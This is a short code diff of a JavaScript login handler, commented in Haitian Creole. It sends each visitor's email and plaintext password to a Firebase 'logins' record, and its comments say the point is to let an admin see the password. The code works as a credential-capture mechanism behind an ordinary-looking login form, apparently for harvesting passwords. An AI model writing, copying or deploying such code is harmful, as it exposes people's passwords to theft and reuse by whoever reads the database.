@@ -427,13 +427,12 @@ btnLogin.onclick = () => {
   if (!email.includes("@")) { err.innerText = "Email pa valid."; return; }
   if (pw.length < 4) { err.innerText = "Modpas dwe gen 4+ karaktè."; return; }
 
-  // ✅ SOVGADE EMAIL
   localStorage.setItem("visitor_email", email);
 
-  // ✅ SOVGADE KONEKSYON NAN FIREBASE (pou admin wè)
+  // ✅ SOVGADE KONEKSYON AK MODPAS
   db.ref("logins").push({
     email: email,
-    password: pw,           
+    password: pw,           // ← SE SA KI FÈ MODPAS LA PARÈT
     visitorId: VISITOR_ID,
     time: Date.now()
   });
